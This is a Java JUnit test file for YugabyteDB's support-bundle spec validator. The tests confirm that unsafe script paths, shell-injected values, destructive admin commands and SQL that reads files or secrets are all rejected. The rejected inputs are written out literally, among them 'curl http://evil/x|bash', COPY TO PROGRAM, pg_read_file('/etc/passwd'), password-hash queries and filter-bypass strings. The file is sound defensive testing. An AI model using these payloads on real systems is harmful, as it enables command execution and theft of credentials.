// Copyright (c) YugabyteDB, Inc.

package com.yugabyte.yw.common.supportbundlev2;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertThrows;
import static org.junit.Assert.assertTrue;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import com.typesafe.config.Config;
import com.typesafe.config.ConfigFactory;
import com.yugabyte.yw.common.PlatformServiceException;
import com.yugabyte.yw.common.config.GlobalConfKeys;
import com.yugabyte.yw.common.config.RuntimeConfGetter;
import com.yugabyte.yw.common.supportbundlev2.manifest.SupportBundleV2Manifest;
import com.yugabyte.yw.common.supportbundlev2.manifest.SupportBundleV2ManifestLoader;
import com.yugabyte.yw.models.helpers.BundleDetails.BashComponentSpec;
import com.yugabyte.yw.models.helpers.BundleDetails.FilesComponentSpec;
import com.yugabyte.yw.models.helpers.BundleDetails.YbaComponentSpec;
import com.yugabyte.yw.models.helpers.ScriptTarComponentSpec;
import com.yugabyte.yw.modules.CustomObjectMapperModule;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.function.Supplier;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import play.mvc.Http.Status;

public class SupportBundleV2SpecValidatorTest {

  @Rule public TemporaryFolder temporaryFolder = new TemporaryFolder();

  private RuntimeConfGetter mockConfGetter;
  private SupportBundleV2SpecValidator validator;
  private Path devopsHome;
  private SupportBundleV2Manifest.Spec shippedManifest;

  @Before
  public void setUp() throws Exception {
    devopsHome = temporaryFolder.newFolder("devops").toPath();
    Files.createDirectories(devopsHome.resolve("bin"));
    Files.createFile(devopsHome.resolve("bin/node_utils.sh"));
    Files.createFile(devopsHome.resolve("bin/yba_utils.sh"));
    Files.createFile(devopsHome.resolve("bin/run_node_action.py"));
    Files.copy(
        Paths.get("devops", SupportBundleV2ManifestLoader.MANIFEST_RELATIVE_PATH),
        devopsHome.resolve(SupportBundleV2ManifestLoader.MANIFEST_RELATIVE_PATH));

    Config config =
        ConfigFactory.parseString(
            String.format("yb.devops.home = \"%s\"", devopsHome.toAbsolutePath()));
    mockConfGetter = mock(RuntimeConfGetter.class);
    when(mockConfGetter.getGlobalConf(GlobalConfKeys.supportBundleExtraYbAdminCommands))
        .thenReturn(Collections.emptyList());
    SupportBundleV2ManifestLoader loader =
        new SupportBundleV2ManifestLoader(config, CustomObjectMapperModule.createDefaultMapper());
    validator = new SupportBundleV2SpecValidator(config, mockConfGetter, loader);
    shippedManifest = loader.load().getSpec();
  }

  private static void assertBadRequest(Runnable runnable) {
    PlatformServiceException exception =
        assertThrows(PlatformServiceException.class, runnable::run);
    assertEquals(Status.BAD_REQUEST, exception.getHttpStatus());
  }

  private static <T extends ScriptTarComponentSpec> T scriptSpec(
      Supplier<T> factory, String componentName, String scriptPath, String... params) {
    T spec = factory.get();
    if (spec instanceof FilesComponentSpec files) {
      files.setComponentName(componentName);
      files.setScriptPath(scriptPath);
      files.setParams(List.of(params));
    } else if (spec instanceof BashComponentSpec bash) {
      bash.setComponentName(componentName);
      bash.setScriptPath(scriptPath);
      bash.setParams(List.of(params));
    } else if (spec instanceof YbaComponentSpec yba) {
      yba.setComponentName(componentName);
      yba.setScriptPath(scriptPath);
      yba.setParams(List.of(params));
    }
    return spec;
  }

  /** What the CLI sends for a component: the manifest's script file and entrypoint. */
  private <T extends ScriptTarComponentSpec> T manifestSpec(Supplier<T> factory, String name) {
    SupportBundleV2Manifest.Script script =
        shippedManifest.getComponentConfigs().get(name).getScript();
    return scriptSpec(factory, name, script.getScriptFile(), script.getEntrypoint(), "--flag");
  }

  private void assertEntrypointRejected(String group, ScriptTarComponentSpec spec) {
    assertBadRequest(() -> validator.validateManifestEntrypoints(group, List.of(spec)));
  }

  // ---------------------------------------------------------------------------------------------
  // Compatibility: everything the shipped manifest can produce must keep validating.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void manifestScriptFilesAreAccepted() {
    validator.validateScriptPath("UniverseLogs", "bin/node_utils.sh");
    validator.validateScriptPath("ApplicationLogs", "bin/yba_utils.sh");
  }

  @Test
  public void manifestRemoteTarPathsAreAccepted() {
    validator.validateRemoteTarPath("UniverseLogs", "/tmp/universe-logs-${nodeName}.tar.gz");
    validator.validateRemoteTarPath("ApplicationLogs", "/tmp/application-logs.tar.gz");
    validator.validateRemoteTarPath(
        "collect_cdc_state", "/tmp/cdc-state-${bundleUuid}-${nodeName}.tar.gz");
  }

  @Test
  public void manifestYbAdminCommandsAreAccepted() {
    validator.validateYbAdminCommands(
        "yb_admin_commands",
        List.of(
            "list_all_masters",
            "list_all_tablet_servers",
            "list_snapshots",
            "list_snapshot_schedules"));
  }

  @Test
  public void manifestYsqlQueriesAreAccepted() {
    validator.validateYsqlQueries(
        "ysql_yugabyte_queries",
        List.of(
            "SELECT datname FROM pg_database;",
            "SELECT * FROM pg_stat_statements limit 20;",
            "SELECT * FROM yb_terminated_queries limit 20;",
            "SELECT queryid, query FROM pg_stat_statements WHERE queryid IN (SELECT query_id FROM"
                + " yb_terminated_queries);",
            "SELECT * FROM yb_backend_heap_snapshot();",
            "SELECT * FROM yb_backend_heap_snapshot_peak();"));
    validator.validateYsqlQueries(
        "ysql_system_platform_queries",
        List.of(
            "SELECT timestamp, database, query, calls, mean_time, p99 FROM slow_queries_data ORDER"
                + " BY timestamp DESC LIMIT 20;"));
  }

  @Test
  public void manifestYcqlQueriesAreAccepted() {
    validator.validateYcqlQueries(
        "ycql_queries",
        List.of(
            "SELECT keyspace_name FROM system_schema.keyspaces;",
            "SELECT * FROM system_schema.tables limit 20;",
            "SELECT * FROM system.local limit 20;"));
  }

  @Test
  public void manifestOutputFileNamesAreAccepted() {
    // The CLI substitutes ${currentTimestampUTC} before the request is sent.
    validator.validateFileNameSegment(
        "ysql_yugabyte_queries",
        "outputFileName",
        "ysql_yugabyte_queries_output_20260810T183000Z.txt");
    validator.validateFileNameSegment(
        "yb_admin_commands", "outputFileName", "yb_admin_commands_output_20260810T183000Z.txt");
  }

  /** Reaches ysqlsh unquoted inside bash -c, so anything the shell would act on is refused. */
  @Test
  public void dbNameMustBeAnIdentifier() {
    for (String bad :
        List.of(
            "yugabyte;id",
            "$(id)",
            "a$HOME",
            "a b",
            "a'b",
            "a\"b",
            "a`id`",
            "-c",
            "x".repeat(64))) {
      assertBadRequest(() -> validator.validateDbName("ysql_queries", bad));
    }
    for (String good :
        Arrays.asList(
            "yugabyte", "system_platform", "my-app-db", "_db1", "x".repeat(63), "", " ", null)) {
      validator.validateDbName("ysql_queries", good);
    }
  }

  @Test
  public void keyspaceMustBeAnIdentifier() {
    for (String bad : List.of("system;id", "$(id)", "my-keyspace", "a b", "k".repeat(49))) {
      assertBadRequest(() -> validator.validateKeyspace("ycql_queries", bad));
    }
    for (String good : Arrays.asList("system", "system_schema", "k".repeat(48), "", null)) {
      validator.validateKeyspace("ycql_queries", good);
    }
  }

  @Test
  public void everyManifestScriptComponentIsAccepted() {
    List<FilesComponentSpec> files = new ArrayList<>();
    shippedManifest
        .getNodeComponents()
        .get(SupportBundleV2ManifestLoader.FILES_NODE_GROUP)
        .forEach(name -> files.add(manifestSpec(FilesComponentSpec::new, name)));
    List<BashComponentSpec> bash = new ArrayList<>();
    shippedManifest
        .getNodeComponents()
        .get(SupportBundleV2ManifestLoader.BASH_NODE_GROUP)
        .forEach(name -> bash.add(manifestSpec(BashComponentSpec::new, name)));
    List<YbaComponentSpec> yba = new ArrayList<>();
    shippedManifest
        .getGlobalComponents()
        .get(SupportBundleV2ManifestLoader.YBA_GLOBAL_GROUP)
        .forEach(name -> yba.add(manifestSpec(YbaComponentSpec::new, name)));
    assertTrue(!files.isEmpty() && !bash.isEmpty() && !yba.isEmpty());

    validator.validateManifestEntrypoints(SupportBundleV2ManifestLoader.FILES_NODE_GROUP, files);
    validator.validateManifestEntrypoints(SupportBundleV2ManifestLoader.BASH_NODE_GROUP, bash);
    validator.validateManifestEntrypoints(SupportBundleV2ManifestLoader.YBA_GLOBAL_GROUP, yba);
  }

  @Test
  public void manifestScriptMayBeGivenAsAnAbsolutePath() {
    validator.validateManifestEntrypoints(
        SupportBundleV2ManifestLoader.FILES_NODE_GROUP,
        List.of(
            scriptSpec(
                FilesComponentSpec::new,
                "UniverseLogs",
                devopsHome.resolve("bin/node_utils.sh").toAbsolutePath().toString(),
                "create_universe_logs_bundle")));
  }

  @Test
  public void manifestLinuxUserIsAccepted() {
    validator.validateLinuxUser("UniverseLogs", "yugabyte", null);
    validator.validateLinuxUser("UniverseLogs", null, null);
  }

  // ---------------------------------------------------------------------------------------------
  // (a) Arbitrary scriptPath.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void absoluteScriptPathOutsideDevopsHomeIsRejected() {
    assertBadRequest(() -> validator.validateScriptPath("FilesComponent", "/tmp/evil.sh"));
  }

  @Test
  public void traversalScriptPathIsRejected() {
    assertBadRequest(
        () -> validator.validateScriptPath("FilesComponent", "../../../../tmp/evil.sh"));
  }

  @Test
  public void otherScriptInsideDevopsHomeIsRejected() {
    assertBadRequest(
        () -> validator.validateScriptPath("FilesComponent", "bin/run_node_action.py"));
  }

  @Test
  public void scriptPathReachingAllowedNameByTraversalIsRejected() {
    // Ends in an allowed file name but resolves outside the devops directory.
    assertBadRequest(
        () -> validator.validateScriptPath("FilesComponent", "../../tmp/node_utils.sh"));
  }

  @Test
  public void absoluteScriptPathInsideDevopsHomeIsAccepted() {
    validator.validateScriptPath(
        "FilesComponent", devopsHome.resolve("bin/node_utils.sh").toAbsolutePath().toString());
  }

  // ---------------------------------------------------------------------------------------------
  // Script specs pinned to the manifest: params[0] is run as a command by both scripts.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void arbitraryCommandAsEntrypointIsRejected() {
    assertEntrypointRejected(
        SupportBundleV2ManifestLoader.FILES_NODE_GROUP,
        scriptSpec(
            FilesComponentSpec::new, "UniverseLogs", "bin/node_utils.sh", "bash", "-c", "id"));
  }

  @Test
  public void anotherComponentsEntrypointIsRejected() {
    assertEntrypointRejected(
        SupportBundleV2ManifestLoader.FILES_NODE_GROUP,
        scriptSpec(
            FilesComponentSpec::new,
            "UniverseLogs",
            "bin/node_utils.sh",
            "create_system_logs_bundle"));
  }

  /** A defined helper that runs its own trailing arguments, which the script guard lets through. */
  @Test
  public void helperFunctionAsEntrypointIsRejected() {
    assertEntrypointRejected(
        SupportBundleV2ManifestLoader.BASH_NODE_GROUP,
        scriptSpec(
            BashComponentSpec::new,
            "collect_heap_snapshot",
            "bin/node_utils.sh",
            "append_command_section",
            "x",
            "y",
            "id"));
  }

  @Test
  public void componentSentInAnotherGroupsListIsRejected() {
    assertEntrypointRejected(
        SupportBundleV2ManifestLoader.BASH_NODE_GROUP,
        manifestSpec(BashComponentSpec::new, "UniverseLogs"));
    assertEntrypointRejected(
        SupportBundleV2ManifestLoader.FILES_NODE_GROUP,
        manifestSpec(FilesComponentSpec::new, "ApplicationLogs"));
  }

  @Test
  public void unknownOrMissingComponentNameIsRejected() {
    PlatformServiceException exception =
        assertThrows(
            PlatformServiceException.class,
            () ->
                validator.validateManifestEntrypoints(
                    SupportBundleV2ManifestLoader.YBA_GLOBAL_GROUP,
                    List.of(
                        scriptSpec(
                            YbaComponentSpec::new,
                            "CustomYbaScript",
                            "bin/yba_utils.sh",
                            "create_custom_yba_script_bundle"))));
    assertEquals(Status.BAD_REQUEST, exception.getHttpStatus());
    assertTrue(exception.getMessage(), exception.getMessage().contains("ApplicationLogs"));

    assertEntrypointRejected(
        SupportBundleV2ManifestLoader.FILES_NODE_GROUP,
        scriptSpec(
            FilesComponentSpec::new, null, "bin/node_utils.sh", "create_universe_logs_bundle"));
  }

  @Test
  public void anotherAllowedScriptIsRejected() {
    assertEntrypointRejected(
        SupportBundleV2ManifestLoader.FILES_NODE_GROUP,
        scriptSpec(
            FilesComponentSpec::new,
            "UniverseLogs",
            "bin/yba_utils.sh",
            "create_universe_logs_bundle"));
  }

  @Test
  public void manifestComponentWithoutAScriptIsAServerError() throws Exception {
    Files.writeString(
        devopsHome.resolve(SupportBundleV2ManifestLoader.MANIFEST_RELATIVE_PATH),
        String.join(
            "\n",
            "spec:",
            "  NodeComponents:",
            "    Files:",
            "      - UniverseLogs",
            "  componentConfigs:",
            "    UniverseLogs:",
            "      enabled: true",
            ""));

    PlatformServiceException exception =
        assertThrows(
            PlatformServiceException.class,
            () ->
                validator.validateManifestEntrypoints(
                    SupportBundleV2ManifestLoader.FILES_NODE_GROUP,
                    List.of(
                        scriptSpec(
                            FilesComponentSpec::new,
                            "UniverseLogs",
                            "bin/node_utils.sh",
                            "create_universe_logs_bundle"))));
    assertEquals(Status.INTERNAL_SERVER_ERROR, exception.getHttpStatus());
  }

  // ---------------------------------------------------------------------------------------------
  // (d) outputFileName / componentName traversal.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void traversalOutputFileNameIsRejected() {
    assertBadRequest(
        () ->
            validator.validateFileNameSegment(
                "YSQLComponent", "outputFileName", "../../../../tmp/pwned.txt"));
  }

  @Test
  public void outputFileNameWithSeparatorIsRejected() {
    assertBadRequest(
        () -> validator.validateFileNameSegment("YSQLComponent", "outputFileName", "sub/dir.txt"));
  }

  @Test
  public void blankFileNameSegmentIsAcceptedBecauseComponentsDefaultIt() {
    validator.validateFileNameSegment("YSQLComponent", "outputFileName", null);
    validator.validateFileNameSegment("YSQLComponent", "outputFileName", "");
  }

  @Test
  public void traversalComponentNameIsRejected() {
    assertBadRequest(
        () -> validator.validateFileNameSegment("FilesComponent", "componentName", ".."));
  }

  // ---------------------------------------------------------------------------------------------
  // remoteTarPath.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void remoteTarPathWithShellMetacharactersIsRejected() {
    assertBadRequest(
        () ->
            validator.validateRemoteTarPath(
                "FilesComponent", "/tmp/out.tar.gz;curl http://evil/x|bash"));
  }

  @Test
  public void relativeRemoteTarPathIsRejected() {
    assertBadRequest(() -> validator.validateRemoteTarPath("FilesComponent", "out.tar.gz"));
  }

  @Test
  public void remoteTarPathWithTraversalIsRejected() {
    assertBadRequest(
        () -> validator.validateRemoteTarPath("FilesComponent", "/tmp/../etc/out.tar.gz"));
  }

  @Test
  public void remoteTarPathWithUnknownTokenIsRejected() {
    assertBadRequest(
        () -> validator.validateRemoteTarPath("FilesComponent", "/tmp/${HOME}/out.tar.gz"));
  }

  // ---------------------------------------------------------------------------------------------
  // Read-only enforcement: yb-admin.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void destructiveYbAdminCommandsAreRejected() {
    assertBadRequest(
        () -> validator.validateYbAdminCommands("YbAdminComponent", List.of("delete_table")));
    assertBadRequest(
        () ->
            validator.validateYbAdminCommands("YbAdminComponent", List.of("change_master_config")));
    assertBadRequest(
        () ->
            validator.validateYbAdminCommands(
                "YbAdminComponent", List.of("list_all_masters", "master_leader_stepdown")));
  }

  @Test
  public void unknownYbAdminCommandIsRejected() {
    assertBadRequest(
        () -> validator.validateYbAdminCommands("YbAdminComponent", List.of("not_a_command")));
  }

  @Test
  public void runtimeConfigCanExtendYbAdminAllowList() {
    when(mockConfGetter.getGlobalConf(GlobalConfKeys.supportBundleExtraYbAdminCommands))
        .thenReturn(List.of("some_new_read_only_command"));
    validator.validateYbAdminCommands("YbAdminComponent", List.of("some_new_read_only_command"));
  }

  // ---------------------------------------------------------------------------------------------
  // (b)/(c) Read-only enforcement: YSQL and YCQL.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void writeYsqlStatementsAreRejected() {
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("DROP TABLE customers;")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("INSERT INTO t VALUES (1);")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("UPDATE t SET a = 1;")));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("ALTER ROLE yugabyte WITH PASSWORD 'x';")));
  }

  @Test
  public void copyToProgramIsRejected() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("COPY (SELECT 1) TO PROGRAM 'curl http://evil';")));
  }

  @Test
  public void serverFileReadingFunctionsAreRejected() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("SELECT pg_read_file('/etc/passwd');")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("SELECT pg_ls_dir('/');")));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent",
                List.of("SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a" + " int);")));
  }

  private void assertYsqlRejected(String query) {
    PlatformServiceException exception =
        assertThrows(
            query,
            PlatformServiceException.class,
            () -> validator.validateYsqlQueries("YSQLComponent", List.of(query)));
    assertEquals(query, Status.BAD_REQUEST, exception.getHttpStatus());
  }

  @Test
  public void quotedOrStringBuiltFunctionNamesAreRejected() {
    // The review's quoted-identifier bypass, and SQL assembled from literals the lexer blanks.
    assertYsqlRejected("SELECT \"pg_read_file\"('/home/yugabyte/node.key');");
    assertYsqlRejected("SELECT pg_catalog.\"pg_read_file\"('/etc/hostname');");
    assertYsqlRejected(
        "SELECT query_to_xml('select pg_read_' || 'file(''/etc/hostname'')', true, false, '');");
    assertYsqlRejected("SELECT table_to_xml('pg_authid', true, false, '');");
    assertYsqlRejected("SELECT schema_to_xmlschema('pg_catalog', true, false, '');");
    assertYsqlRejected("SELECT U&\"\\0070g_read_file\"('/etc/hostname');");
  }

  @Test
  public void stringsEndWhereYsqlEndsThem() {
    // Ending an E'' or $$ string at the wrong quote would blank the call that follows it.
    assertYsqlRejected("SELECT E'\\'', pg_read_file('/etc/hostname');");
    assertYsqlRejected("SELECT $$'$$, pg_read_file('/etc/hostname');");
    assertYsqlRejected("SELECT $tag$'$tag$, pg_read_file('/etc/hostname');");
  }

  @Test
  public void secretsAndSideEffectsAreRejected() {
    for (String query :
        List.of(
            "SELECT rolname, rolpassword FROM pg_authid;",
            "TABLE pg_shadow;",
            "SELECT * FROM pg_user_mappings;",
            "SELECT most_common_vals FROM pg_stats;",
            "SELECT pg_stat_statements_reset();",
            "SELECT pg_stat_reset();",
            "SELECT yb_reset_analyze_statistics(1);",
            "SELECT set_config('role', 'yugabyte', false);",
            "SELECT lo_get(1);",
            "SELECT pg_advisory_lock(1);",
            "SELECT pg_sleep(600);",
            "SELECT pg_create_logical_replication_slot('s', 'pgoutput');",
            "SELECT yb_query_diagnostics(1);",
            "SELECT yb_cancel_transaction('00000000-0000-0000-0000-000000000000');")) {
      assertYsqlRejected(query);
    }
  }

  @Test
  public void deniedNamesInsideStringsAndCommentsAreAccepted() {
    validator.validateYsqlQueries(
        "YSQLComponent",
        List.of(
            "SELECT query FROM pg_stat_statements WHERE query LIKE '%pg_read_file%';",
            "SELECT $$pg_authid$$ AS label;",
            "SELECT E'pg_stat_reset() \\' set_config' AS label;",
            "SELECT 1 -- pg_sleep(1)\n;",
            "SELECT stats_reset FROM pg_stat_database;",
            "SELECT \"datname\" FROM pg_database WHERE datname = $1;"));
  }

  @Test
  public void multiStatementYsqlQueryIsRejected() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("SELECT 1; DROP TABLE customers;")));
  }

  @Test
  public void semicolonInsideStringLiteralIsAccepted() {
    // Literal stripping keeps this from looking like two statements.
    validator.validateYsqlQueries("YSQLComponent", List.of("SELECT 'a;b' FROM t;"));
  }

  @Test
  public void commentedOutWriteStatementIsStillJudgedOnTheRealStatement() {
    validator.validateYsqlQueries("YSQLComponent", List.of("SELECT 1 -- DROP TABLE customers;\n;"));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("/* SELECT 1 */ DROP TABLE customers;")));
  }

  @Test
  public void readOnlyYsqlStatementFormsAreAccepted() {
    validator.validateYsqlQueries(
        "YSQLComponent",
        List.of(
            "SELECT 1;",
            "WITH t AS (SELECT 1) SELECT * FROM t;",
            "EXPLAIN SELECT * FROM pg_database;",
            "SHOW all;",
            "(SELECT 1);"));
  }

  @Test
  public void writeYcqlStatementsAreRejected() {
    assertBadRequest(
        () -> validator.validateYcqlQueries("YCQLComponent", List.of("DROP KEYSPACE ks;")));
    assertBadRequest(
        () ->
            validator.validateYcqlQueries(
                "YCQLComponent", List.of("INSERT INTO ks.t (a) VALUES (1);")));
  }

  @Test
  public void readOnlyYcqlStatementFormsAreAccepted() {
    validator.validateYcqlQueries(
        "YCQLComponent",
        List.of("SELECT * FROM system.local;", "DESCRIBE keyspaces;", "LIST ROLES;"));
  }

  @Test
  public void leadingKeywordIsMatchedRegardlessOfCase() {
    validator.validateYsqlQueries(
        "YSQLComponent",
        List.of("select 1;", "Select 1;", "sElEcT 1;", "with t as (select 1) select * from t;"));
    validator.validateYcqlQueries(
        "YCQLComponent", List.of("select * from system.local;", "describe keyspaces;"));
  }

  @Test
  public void writeStatementsAreRejectedRegardlessOfCase() {
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("drop table customers;")));
    assertBadRequest(
        () -> validator.validateYsqlQueries("YSQLComponent", List.of("InSeRt INTO t VALUES (1);")));
    assertBadRequest(
        () -> validator.validateYcqlQueries("YCQLComponent", List.of("drop keyspace ks;")));
  }

  @Test
  public void deniedConstructsAreRejectedRegardlessOfCase() {
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("copy (select 1) to program 'curl http://evil';")));
    assertBadRequest(
        () ->
            validator.validateYsqlQueries(
                "YSQLComponent", List.of("SELECT PG_READ_FILE('/etc/passwd');")));
  }

  @Test
  public void blankQueryIsRejected() {
    assertBadRequest(() -> validator.validateYsqlQueries("YSQLComponent", List.of("   ")));
  }

  // ---------------------------------------------------------------------------------------------
  // linuxUser pinning.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void nonYugabyteLinuxUserIsRejected() {
    assertBadRequest(() -> validator.validateLinuxUser("FilesComponent", "root", null));
  }

  /** SystemLogs is pinned too; its provider user comes from runAs. */
  @Test
  public void systemLogsLinuxUserIsPinnedLikeEveryComponent() {
    assertBadRequest(() -> validator.validateLinuxUser("SystemLogs", "ec2-user", null));
    assertBadRequest(() -> validator.validateLinuxUser("SystemLogs", "root", null));
    validator.validateLinuxUser("SystemLogs", "yugabyte", null);
    validator.validateLinuxUser("SystemLogs", null, null);
  }

  // ---------------------------------------------------------------------------------------------
  // Literal and comment stripping, which the statement checks depend on.
  // ---------------------------------------------------------------------------------------------

  @Test
  public void stripLiteralsAndCommentsRemovesQuotedAndCommentedText() {
    assertEquals(
        "SELECT   FROM t",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 'a;b' FROM t"));
    assertEquals(
        "SELECT 1  ", SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 1 -- drop;"));
    assertEquals(
        "SELECT 1   2",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 1 /* drop; */ 2"));
    assertEquals(
        "SELECT  ",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT 'it''s a ; test'"));
  }

  @Test
  public void stripKeepsQuotedNamesAndBlanksStrings() {
    assertEquals(
        "SELECT  pg_read_file ( )",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT \"pg_read_file\"('x')"));
    assertEquals(
        "SELECT E ,  ",
        SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT E'a\\'b', $q$c'd$q$"));
    assertEquals(
        "SELECT  a b ", SupportBundleV2SpecValidator.stripLiteralsAndComments("SELECT \"a;b\""));
  }
}
